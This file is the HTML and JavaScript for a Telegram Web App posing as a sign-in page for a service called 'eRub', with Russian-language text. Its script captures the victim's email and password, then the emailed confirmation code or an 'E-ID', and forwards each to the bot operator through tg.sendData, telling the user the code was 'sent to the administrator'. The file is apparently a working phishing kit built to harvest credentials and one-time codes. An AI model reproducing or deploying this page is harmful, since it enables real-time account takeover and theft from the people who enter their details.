<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в eRub</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f7fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 32px;
            padding: 48px 40px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
            min-height: 540px;
            display: flex;
            flex-direction: column;
            transition: all 0.3s;
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo h1 {
            font-size: 34px;
            font-weight: 800;
            color: #1a1a2e;
            letter-spacing: -0.5px;
        }
        .logo h1 span {
            color: #4361ee;
        }
        .logo .sub {
            color: #6c757d;
            font-size: 13px;
            margin-top: 2px;
            font-weight: 400;
        }

        .form-group {
            margin-bottom: 18px;
        }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1a1a2e;
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e9ecef;
            border-radius: 14px;
            font-size: 15px;
            transition: 0.2s;
            background: #f8f9fa;
        }
        .form-group input:focus {
            outline: none;
            border-color: #4361ee;
            background: white;
            box-shadow: 0 0 0 4px rgba(67, 97, 238, 0.08);
        }

        .btn-primary {
            width: 100%;
            padding: 16px;
            background: #4361ee;
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 6px;
        }
        .btn-primary:hover {
            background: #3651d4;
            transform: translateY(-1px);
            box-shadow: 0 8px 25px rgba(67, 97, 238, 0.3);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .btn-eid {
            width: 100%;
            padding: 16px;
            background: #1a1a2e;
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn-eid:hover {
            background: #2d2d44;
            transform: translateY(-1px);
        }

        .btn-secondary {
            width: 100%;
            padding: 14px;
            background: #f1f3f5;
            color: #1a1a2e;
            border: none;
            border-radius: 14px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }
        .btn-secondary:hover {
            background: #e9ecef;
        }

        .divider {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 20px 0 16px;
        }
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #e9ecef;
        }
        .divider span {
            color: #adb5bd;
            font-size: 12px;
            font-weight: 500;
        }

        .forgot-link {
            text-align: right;
            margin-top: -10px;
            margin-bottom: 12px;
        }
        .forgot-link a {
            color: #6c757d;
            font-size: 13px;
            text-decoration: none;
        }
        .forgot-link a:hover {
            color: #4361ee;
            text-decoration: underline;
        }

        .register-link {
            text-align: center;
            font-size: 14px;
            color: #6c757d;
            margin-top: 6px;
        }
        .register-link a {
            color: #4361ee;
            font-weight: 600;
            text-decoration: none;
        }
        .register-link a:hover {
            text-decoration: underline;
        }

        .support-btn {
            width: 100%;
            padding: 14px;
            background: #f8f9fa;
            color: #1a1a2e;
            border: 2px solid #e9ecef;
            border-radius: 14px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 14px;
        }
        .support-btn:hover {
            background: #e9ecef;
        }

        .message {
            margin-top: 16px;
            padding: 12px 16px;
            border-radius: 12px;
            display: none;
            text-align: center;
            font-size: 14px;
            font-weight: 500;
        }
        .message.success {
            display: block;
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .message.error {
            display: block;
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .message.info {
            display: block;
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .hidden {
            display: none !important;
        }

        /* ===== КОД ===== */
        .code-box {
            text-align: center;
            margin: 8px 0 16px;
        }
        .code-box input {
            text-align: center;
            font-size: 28px;
            letter-spacing: 12px;
            padding: 16px;
            border: 2px solid #e9ecef;
            border-radius: 14px;
            width: 100%;
            max-width: 220px;
            margin: 0 auto;
            background: #f8f9fa;
            font-weight: 600;
        }
        .code-box input:focus {
            outline: none;
            border-color: #4361ee;
            background: white;
            box-shadow: 0 0 0 4px rgba(67, 97, 238, 0.08);
        }
        .code-hint {
            font-size: 13px;
            color: #6c757d;
            margin-bottom: 16px;
            text-align: center;
        }
        .code-status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #28a745;
            font-weight: 500;
            font-size: 14px;
            margin-top: 12px;
        }
        .code-status .dot {
            width: 10px;
            height: 10px;
            background: #28a745;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0%,
            100% {
                opacity: 1;
                transform: scale(1);
            }
            50% {
                opacity: 0.5;
                transform: scale(0.8);
            }
        }

        .step-title {
            font-size: 20px;
            font-weight: 700;
            color: #1a1a2e;
            margin-bottom: 4px;
        }
        .step-sub {
            font-size: 14px;
            color: #6c757d;
            margin-bottom: 16px;
        }

        .eid-icon {
            font-size: 20px;
        }
    </style>
</head>
<body>
    <div class="container">

        <!-- ===== ЛОГО ===== -->
        <div class="logo">
            <h1><span>eRub</span></h1>
            <div class="sub">ON-LINE CERTIFICATION AND AUTHORIZATION SERVICE</div>
        </div>

        <!-- ========================================= -->
        <!-- ===== ШАГ 1: ЛОГИН ===== -->
        <!-- ========================================= -->
        <div id="stepLogin">
            <div class="form-group">
                <label>Email</label>
                <input type="email" id="email" placeholder="Введите ваш email">
            </div>
            <div class="form-group">
                <label>Пароль</label>
                <input type="password" id="password" placeholder="Введите пароль">
            </div>
            <div class="forgot-link">
                <a href="#" onclick="showMsg('Функция восстановления скоро появится', 'info')">Забыли пароль?</a>
            </div>

            <button id="loginBtn" class="btn-primary">ВХОД</button>

            <div class="divider"><span>или</span></div>

            <!-- ===== E-ID КНОПКА ===== -->
            <button id="eidBtn" class="btn-eid">
                <span class="eid-icon">🆔</span> Вход через E-ID
            </button>

            <div class="register-link" style="margin-top:16px;">
                Нет аккаунта? <a href="#" onclick="showMsg('Регистрация скоро появится', 'info')">Зарегистрироваться</a>
            </div>
        </div>

        <!-- ========================================= -->
        <!-- ===== ШАГ 2: КОД ===== -->
        <!-- ========================================= -->
        <div id="stepCode" class="hidden">
            <div style="text-align:center;margin-bottom:12px;">
                <div style="font-size:40px;">📧</div>
                <div class="step-title">Код подтверждения</div>
                <div class="step-sub">Введите код, отправленный на вашу почту</div>
            </div>

            <div class="code-box">
                <input type="text" id="codeInput" maxlength="6" placeholder="• • • • • •" inputmode="numeric">
            </div>
            <p class="code-hint">Код из 6 цифр</p>

            <button id="codeBtn" class="btn-primary">✅ Подтвердить</button>

            <div class="code-status">
                <span class="dot"></span>
                Ожидание кода...
            </div>

            <button id="backBtn" class="btn-secondary">← Назад</button>
        </div>

        <!-- ========================================= -->
        <!-- ===== ШАГ 3: E-ID ===== -->
        <!-- ========================================= -->
        <div id="stepEid" class="hidden">
            <div style="text-align:center;margin-bottom:12px;">
                <div style="font-size:40px;">🆔</div>
                <div class="step-title">Вход через E-ID</div>
                <div class="step-sub">Введите ваш E-ID для авторизации</div>
            </div>

            <div class="form-group">
                <label>E-ID</label>
                <input type="text" id="eidInput" placeholder="Введите ваш E-ID">
            </div>

            <button id="eidSubmitBtn" class="btn-primary">🔓 Войти через E-ID</button>

            <button id="backFromEidBtn" class="btn-secondary">← Назад</button>
        </div>

        <!-- ===== СООБЩЕНИЯ ===== -->
        <div id="msg" class="message"></div>

        <!-- ===== ТЕХПОДДЕРЖКА ===== -->
        <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
    </div>

    <script>
        // ============================================================
        // 1. ИНИЦИАЛИЗАЦИЯ
        // ============================================================
        const tg = window.Telegram.WebApp;
        tg.expand();

        // Элементы
        const stepLogin = document.getElementById('stepLogin');
        const stepCode = document.getElementById('stepCode');
        const stepEid = document.getElementById('stepEid');
        const email = document.getElementById('email');
        const password = document.getElementById('password');
        const codeInput = document.getElementById('codeInput');
        const eidInput = document.getElementById('eidInput');
        const loginBtn = document.getElementById('loginBtn');
        const codeBtn = document.getElementById('codeBtn');
        const backBtn = document.getElementById('backBtn');
        const eidBtn = document.getElementById('eidBtn');
        const eidSubmitBtn = document.getElementById('eidSubmitBtn');
        const backFromEidBtn = document.getElementById('backFromEidBtn');
        const msgDiv = document.getElementById('msg');

        function showMsg(text, type = 'info') {
            msgDiv.textContent = text;
            msgDiv.className = `message ${type}`;
            msgDiv.style.display = 'block';
            clearTimeout(msgDiv._timer);
            msgDiv._timer = setTimeout(() => {
                msgDiv.style.display = 'none';
            }, 5000);
        }

        function goToStep(step) {
            stepLogin.classList.add('hidden');
            stepCode.classList.add('hidden');
            stepEid.classList.add('hidden');
            step.classList.remove('hidden');
            msgDiv.style.display = 'none';
        }

        // ============================================================
        // 2. ЛОГИН → ОТПРАВКА EMAIL + ПАРОЛЬ
        // ============================================================
        loginBtn.addEventListener('click', function() {
            const e = email.value.trim();
            const p = password.value.trim();

            if (!e || !p) {
                showMsg('Заполните все поля', 'error');
                return;
            }
            if (!e.includes('@')) {
                showMsg('Введите корректный email', 'error');
                return;
            }

            loginBtn.disabled = true;
            loginBtn.textContent = '⏳ Отправка...';

            try {
                tg.sendData(JSON.stringify({ email: e, password: p }));
                loginBtn.disabled = false;
                loginBtn.textContent = 'ВХОД';
                // СРАЗУ ОТКРЫВАЕМ ОКНО КОДА
                goToStep(stepCode);
                showMsg('✅ Данные отправлены. Введите код с почты.', 'success');
                setTimeout(() => codeInput.focus(), 300);
            } catch (err) {
                showMsg('❌ Ошибка отправки. Попробуйте ещё раз.', 'error');
                loginBtn.disabled = false;
                loginBtn.textContent = 'ВХОД';
            }
        });

        // ============================================================
        // 3. КОД → ОТПРАВКА КОДА
        // ============================================================
        codeBtn.addEventListener('click', function() {
            const code = codeInput.value.trim();

            if (!code || code.length < 4) {
                showMsg('Введите корректный код (минимум 4 символа)', 'error');
                return;
            }

            codeBtn.disabled = true;
            codeBtn.textContent = '⏳ Отправка...';

            try {
                tg.sendData(JSON.stringify({ code: code }));
                showMsg('✅ Код отправлен администратору!', 'success');
                codeBtn.disabled = false;
                codeBtn.textContent = '✅ Подтвердить';
                codeInput.value = '';

                setTimeout(() => {
                    goToStep(stepLogin);
                    showMsg('✅ Проверка завершена. Ожидайте ответа.', 'success');
                }, 2000);

            } catch (err) {
                showMsg('❌ Ошибка отправки кода', 'error');
                codeBtn.disabled = false;
                codeBtn.textContent = '✅ Подтвердить';
            }
        });

        // ============================================================
        // 4. НАЗАД (из кода)
        // ============================================================
        backBtn.addEventListener('click', function() {
            goToStep(stepLogin);
        });

        // ============================================================
        // 5. E-ID → ОТКРЫТЬ ОКНО E-ID
        // ============================================================
        eidBtn.addEventListener('click', function() {
            goToStep(stepEid);
            setTimeout(() => eidInput.focus(), 300);
        });

        // ============================================================
        // 6. E-ID → ОТПРАВКА E-ID
        // ============================================================
        eidSubmitBtn.addEventListener('click', function() {
            const eid = eidInput.value.trim();

            if (!eid) {
                showMsg('Введите ваш E-ID', 'error');
                return;
            }

            eidSubmitBtn.disabled = true;
            eidSubmitBtn.textContent = '⏳ Отправка...';

            try {
                tg.sendData(JSON.stringify({ eid: eid }));
                showMsg('✅ E-ID отправлен администратору!', 'success');
                eidSubmitBtn.disabled = false;
                eidSubmitBtn.textContent = '🔓 Войти через E-ID';
                eidInput.value = '';

                setTimeout(() => {
                    goToStep(stepLogin);
                    showMsg('✅ Проверка завершена. Ожидайте ответа.', 'success');
                }, 2000);

            } catch (err) {
                showMsg('❌ Ошибка отправки E-ID', 'error');
                eidSubmitBtn.disabled = false;
                eidSubmitBtn.textContent = '🔓 Войти через E-ID';
            }
        });

        // ============================================================
        // 7. НАЗАД (из E-ID)
        // ============================================================
        backFromEidBtn.addEventListener('click', function() {
            goToStep(stepLogin);
        });

        // ============================================================
        // 8. ENTER
        // ============================================================
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                if (!stepLogin.classList.contains('hidden')) {
                    loginBtn.click();
                } else if (!stepCode.classList.contains('hidden')) {
                    codeBtn.click();
                } else if (!stepEid.classList.contains('hidden')) {
                    eidSubmitBtn.click();
                }
            }
        });

        // ============================================================
        // 9. ТЕХПОДДЕРЖКА
        // ============================================================
        function openSupport() {
            window.open('https://t.me/potok457', '_blank');
        }
    </script>
</body>
</html>
